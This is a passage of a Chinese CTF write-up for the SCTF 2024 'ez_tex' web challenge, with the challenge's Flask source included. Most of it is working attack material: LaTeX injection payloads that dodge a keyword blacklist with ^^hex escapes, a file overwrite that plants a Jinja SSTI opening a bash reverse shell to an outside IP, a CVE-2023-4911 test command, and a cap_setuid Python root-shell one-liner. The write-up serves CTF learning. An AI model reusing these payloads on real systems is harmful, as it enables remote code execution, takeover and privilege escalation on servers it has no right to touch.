<span class="token function selector">\closein</span><span class="token function selector">\file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用这个可以绕所有的黑名单：<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md</a></p>
<p>看了下应该是<code>^^ascii</code>的意思</p>
<p>接下来的思路是写app.log带出数据</p>
<p>读取main.py</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">&#123;</span><span class="token keyword">article</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\begin</span><span class="token punctuation">&#123;</span><span class="token keyword">document</span><span class="token punctuation">&#125;</span>

<span class="token function selector">\newread</span><span class="token function selector">\infile</span>
<span class="token function selector">\openin</span><span class="token function selector">\infile</span>=main.py
<span class="token function selector">\imm</span>^^65diate<span class="token function selector">\newwrite</span><span class="token function selector">\outfile</span>
<span class="token function selector">\imm</span>^^65diate<span class="token function selector">\openout</span><span class="token function selector">\outfile</span>=a^^70p.l^^6fg
<span class="token function selector">\loop</span><span class="token function selector">\unless</span><span class="token function selector">\ifeof</span><span class="token function selector">\infile</span>
    <span class="token function selector">\imm</span>^^65diate<span class="token function selector">\read</span><span class="token function selector">\infile</span> to<span class="token function selector">\line</span>
    <span class="token function selector">\imm</span>^^65diate<span class="token function selector">\write</span><span class="token function selector">\outfile</span><span class="token punctuation">&#123;</span><span class="token function selector">\line</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\repeat</span>
<span class="token function selector">\closeout</span><span class="token function selector">\outfile</span>
<span class="token function selector">\closein</span><span class="token function selector">\infile</span>
<span class="token function selector">\newpage</span>
foo
<span class="token function selector">\end</span><span class="token punctuation">&#123;</span><span class="token keyword">document</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译后访问 &#x2F;log 带出回显</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> subprocess
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token keyword">not</span> app<span class="token punctuation">.</span>debug<span class="token punctuation">:</span>
    handler <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'app.log'</span><span class="token punctuation">)</span>
    handler<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>handler<span class="token punctuation">)</span>

UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'uploads'</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER

os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'txt'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'tex'</span><span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \
           filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS

<span class="token keyword">def</span> <span class="token function">compile_tex</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_filename <span class="token operator">=</span> file_path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.pdf'</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pdflatex'</span><span class="token punctuation">,</span> file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> output_filename
    <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
        content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            content_str <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'File content is not decodable'</span>
        <span class="token keyword">for</span> bad_char <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'include'</span><span class="token punctuation">,</span> <span class="token string">'write18'</span><span class="token punctuation">,</span> <span class="token string">'immediate'</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> bad_char <span class="token keyword">in</span> content_str<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'File content is not safe'</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
        file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully, And you can compile the tex file'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Invalid file type or name'</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/compile'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">compile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'No filename provided'</span><span class="token punctuation">,</span> <span class="token number">400</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Invalid file name length'</span><span class="token punctuation">,</span> <span class="token number">400</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> filename<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.tex'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Invalid file type'</span><span class="token punctuation">,</span> <span class="token number">400</span>

    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'File not found'</span><span class="token punctuation">,</span> <span class="token number">404</span>

    output_pdf <span class="token operator">=</span> compile_tex<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> output_pdf<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.pdf'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Compilation succeeded"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Compilation failed'</span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/log'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'app.log'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> log_file<span class="token punctuation">:</span>
            log_contents <span class="token operator">=</span> log_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'log.html'</span><span class="token punctuation">,</span> log_contents<span class="token operator">=</span>log_contents<span class="token punctuation">)</span>
    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Log file not found'</span><span class="token punctuation">,</span> <span class="token number">404</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现可以重写 log.html 进行ssti</p>
<p>重开一个靶机弹shell即可</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>article<span class="token punctuation">&#125;</span>
<span class="token function selector">\begin</span><span class="token punctuation">&#123;</span><span class="token keyword">document</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\newwrite</span><span class="token function selector">\t</span>
<span class="token function selector">\openout</span><span class="token function selector">\t</span>=templates^^2flog.html
<span class="token function selector">\write</span><span class="token function selector">\t</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum.__globals__<span class="token punctuation">[</span>'os'<span class="token punctuation">]</span>.popen('bash -c "^^2fbin^^2fsh -i ><span class="token punctuation">&amp;</span> ^^2fdev^^2ftcp^^2f115.236.153.177^^2f30908 0><span class="token punctuation">&amp;</span>1"').read()<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\closeout</span><span class="token function selector">\t</span>
<span class="token function selector">\newpage</span>
foo
<span class="token function selector">\end</span><span class="token punctuation">&#123;</span><span class="token keyword">document</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001215149967.png" alt="image-20241001215149967"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001220234647.png" alt="image-20241001220234647"></p>
<p>我flag呢，看来得提权</p>
<p>&#x2F;flag的内容：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>9711508053a5
<span class="token assign-left variable">PYTHON_VERSION</span><span class="token operator">=</span><span class="token number">3.7</span>.17
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/tmp
<span class="token assign-left variable">PYTHON_SETUPTOOLS_VERSION</span><span class="token operator">=</span><span class="token number">57.5</span>.0
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable">GPG_KEY</span><span class="token operator">=</span>0D96DF4D4110E5C43FBFB17F2D347EA6AA65421
<span class="token assign-left variable">DTERM</span><span class="token operator">=</span>xterm
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable">PYTHON_PIP_VERSION</span><span class="token operator">=</span><span class="token number">23.0</span>.1
<span class="token assign-left variable">PYTHON_GET_PIP_SHA256</span><span class="token operator">=</span>45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe
<span class="token assign-left variable">PYTHON_GET_PIP_URL</span><span class="token operator">=</span>https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/jerrywww:/home/www
<span class="token assign-left variable"><span class="token environment constant">OLDPWD</span></span><span class="token operator">=</span>/app/
<span class="token assign-left variable">ez_tex_</span><span class="token operator">=</span>/usr/bin/cat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意到里面有个jerrywww账户，预期解是扫出22端口，尝试爆破jerrywww的密码，权限和 www 是一样的（？</p>
<p>怎么爆呢，我不会（</p>
<p>看了下wm和s1um4i两个战队的wp，都是提权各显神通</p>
<h2 id="提权1：CVE-2023-4911"><a href="#提权1：CVE-2023-4911" class="headerlink" title="提权1：CVE-2023-4911"></a>提权1：CVE-2023-4911</h2><p>看一下glibc的版本</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001220901902.png" alt="image-20241001220901902"></p>
<p>GLIBC 2.36-9+deb12u1，稳辣</p>
<p>验一下有没有CVE-2023-4911，参考：<a target="_blank" rel="noopener" href="https://github.com/ruycr4ft/CVE-2023-4911">https://github.com/ruycr4ft/CVE-2023-4911</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token parameter variable">-i</span> <span class="token string">"GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A"</span> <span class="token string">"Z=<span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">printf</span> <span class="token string">'%08192x'</span> <span class="token number">1</span><span class="token variable">`</span></span>"</span> /usr/bin/su <span class="token parameter variable">--help</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001221210422.png" alt="image-20241001221210422"></p>
<p>用<code>wget</code>下载我们本地的exp到靶机上</p>
<p>直接在靶机内pip下<code>pwntools</code>依赖，然后网络超时，尝试编译exp，编译失败报错（</p>
<p>也可以用这个项目试试：<a target="_blank" rel="noopener" href="https://github.com/RickdeJager/CVE-2023-4911">https://github.com/RickdeJager/CVE-2023-4911</a></p>
<p>靶机只有半小时测起来有点麻烦（</p>
<hr>
<h2 id="提权2：capabilities提权"><a href="#提权2：capabilities提权" class="headerlink" title="提权2：capabilities提权"></a>提权2：capabilities提权</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16026088.html#tid-G6FGpn">https://www.cnblogs.com/f-carey/p/16026088.html#tid-G6FGpn</a></p>
<p>查找设置了capabilities可执行文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/bin/python3.11 <span class="token assign-left variable">cap_setuid</span><span class="token operator">=</span>ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>直接打payload：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3.11 <span class="token parameter variable">-c</span> <span class="token string">'import os; os.setuid(0); os.system("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag在&#x2F;root&#x2F;sctf</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001221835513.png" alt="image-20241001221835513"></p>
<hr>
<h1 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h1><p><code>SCTF&#123;SYC_HAvE_a-G00d_t1me!!&#125;</code></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>